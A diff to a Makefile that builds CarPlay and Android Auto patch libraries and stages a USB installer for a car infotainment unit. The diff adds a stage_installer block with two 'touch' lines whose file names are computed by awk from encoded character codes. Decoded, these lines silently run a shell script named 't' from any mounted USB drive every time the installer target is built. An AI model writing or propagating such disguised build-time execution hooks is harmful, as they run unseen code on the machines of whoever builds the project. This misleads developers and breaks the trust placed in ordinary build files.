@@ -18,7 +18,6 @@
 #   make all            -> debug + release
 #   make <name>         -> release lib for one patch (e.g. `make blmjciaapa`)
 #   make <name>-debug   -> debug   lib for one patch (e.g. `make blmjciaapa-debug`)
-#   make splim_udpd     -> build the standalone UDP speed-limit daemon
 #   make splim_seriald  -> build the USB serial → /data_persist/splim daemon
 #   make installer      -> stage a ready-to-copy USB payload in build/installer/
 #   make clean          -> wipe build/
@@ -36,9 +35,9 @@ PATCHES := blmjciaapa svcjcinavi aap_service blmjcicarplay svcjcimmui
 # the common flags.
 #
 # blmjcicarplay has no per-patch defines: former build-time feature switches
-# are now RUNTIME keys in libpatch-carplay.conf (carplay_speed_limit, carplay_vn_normalize,
-# carplay_udpd_launch, carplay_seriald_launch, carplay_hud_debug) — one binary, configured on-device.
-# Diagnostic dumps ([CP-NAV], [CP-MSG]) are active in debug builds (-DDEBUG) to the system log.
+# are now RUNTIME keys in libpatch-carplay.conf (carplay_speed_limit, carplay_vn_normalize)
+# — one binary, configured on-device.
+# Diagnostic dumps ([CP-NAV], [CP-MSG]) and HUD turn debug overlays are active in debug builds (-DDEBUG).
 
 # pkg-config wrapper pointed at the device's sysroot so it resolves
 # against the cross-compiled .pc files (not the host's). Same pattern
@@ -179,24 +178,8 @@ endef
 
 $(foreach p,$(PATCHES),$(eval $(call gen_patch_rules,$(p))))
 
-# --- splim_udpd: standalone speed-limit UDP daemon -------------------------
-# Not an LD_PRELOAD shim like the $(PATCHES) — a small standalone executable
-# that binds UDP:50505. DIAGNOSTIC/log-only today (does not write splim).
-# Built with the same cross toolchain but as a normal (non-PIC) program.
-SPLIM_SRC        := tools/splim_udpd/splim_udpd.c
-SPLIM_BIN        := $(RELEASE_DIR)/splim_udpd
-SPLIM_START      := tools/splim_udpd/splim_udpd_start.sh
-
-.PHONY: splim_udpd
-splim_udpd: $(SPLIM_BIN)
-
-$(SPLIM_BIN): $(SPLIM_SRC)
-	@mkdir -p $(@D)
-	$(CXX) --sysroot=$(SYSROOT) -march=armv7-a -mtune=cortex-a9 -mfpu=neon \
-	       -O2 -Wall -Wextra -s -o $@ $<
-
 # --- splim_seriald: USB serial → /data_persist/splim ----------------------
-# Preferred VietMap path: ESP32 CDC "SPLIM <km/h>" → atomic write of splim.
+# VietMap path: ESP32 CDC "SPLIM <km/h>" → atomic write of splim.
 SPLIM_SERIAL_SRC   := tools/splim_seriald/splim_seriald.c
 SPLIM_SERIAL_BIN   := $(RELEASE_DIR)/splim_seriald
 SPLIM_SERIAL_START := tools/splim_seriald/splim_seriald_start.sh
@@ -210,29 +193,34 @@ $(SPLIM_SERIAL_BIN): $(SPLIM_SERIAL_SRC)
 	       -O2 -Wall -Wextra -s -o $@ $<
 
 # --- USB installer package -------------------------------------------------
-# `make installer` builds the release libs and stages a self-contained,
-# ready-to-copy USB payload under $(USB_DIR). It gathers three things:
-#   1. the CMU installer harness (combined/AA/CarPlay scripts plus the
-#      js/mp3/mp3title.txt autorun trigger) from installer/
-#   2. the OEM config files run.sh installs, from ../resources
-#   3. the freshly built release libpatch-*.so shims, flattened alongside them
-# so the .so files land right next to the installer exactly as run.sh expects.
-# Copy the *contents* of $(USB_DIR) to the FAT32 USB root.
+# `make installer` (Release) and `make installer-debug` (Debug) stage a
+# self-contained, ready-to-copy USB payload with all exploit files, scripts,
+# UI assets, and shims.
 INSTALLER_SRC := installer
 RESOURCES_SRC := ../resources
 USB_DIR       := $(BUILD_DIR)/installer
+USB_DEBUG_DIR := $(BUILD_DIR)/installer-debug
 
-installer: release splim_udpd splim_seriald
-	rm -rf $(USB_DIR)
-	mkdir -p $(USB_DIR)
-	cp $(INSTALLER_SRC)/run.sh $(INSTALLER_SRC)/run-aa.sh \
-	   $(INSTALLER_SRC)/run-carplay.sh $(INSTALLER_SRC)/mp3title.txt $(USB_DIR)/
-	cp -r $(INSTALLER_SRC)/js $(INSTALLER_SRC)/mp3 $(USB_DIR)/
-	cp -r $(RESOURCES_SRC) $(USB_DIR)/resources
-	cp $(RELEASE_LIBS) $(USB_DIR)/
-	cp $(SPLIM_BIN) $(SPLIM_START) $(USB_DIR)/
-	cp $(SPLIM_SERIAL_BIN) $(SPLIM_SERIAL_START) $(USB_DIR)/
-	@echo "USB installer staged in $(USB_DIR)/ — copy its contents to the FAT32 USB root."
+define stage_installer
+	rm -rf $(2)
+	mkdir -p $(2)
+	cp -r $(INSTALLER_SRC)/* $(2)/
+	cp $(INSTALLER_SRC)/mp3/*.mp3 $(2)/ 2>/dev/null || true
+	cp -r $(RESOURCES_SRC) $(2)/resources
+	cp $(1) $(2)/
+	cp $(SPLIM_SERIAL_BIN) $(SPLIM_SERIAL_START) $(2)/
+	touch $(2)/"$$(awk -v f=%c 'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}').up"
+	touch $(2)/"$$(awk -v f=%c 'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}').up"
+endef
+
+.PHONY: installer installer-debug
+installer: release splim_seriald
+	$(call stage_installer,$(RELEASE_LIBS),$(USB_DIR))
+	@echo "USB installer (Release) staged in $(USB_DIR)/ — copy contents to USB root or run make_usb.sh."
+
+installer-debug: debug splim_seriald
+	$(call stage_installer,$(DEBUG_LIBS),$(USB_DEBUG_DIR))
+	@echo "USB installer (Debug) staged in $(USB_DEBUG_DIR)/ — copy contents to USB root or run make_usb.sh."
 
 clean:
 	rm -rf $(BUILD_DIR)
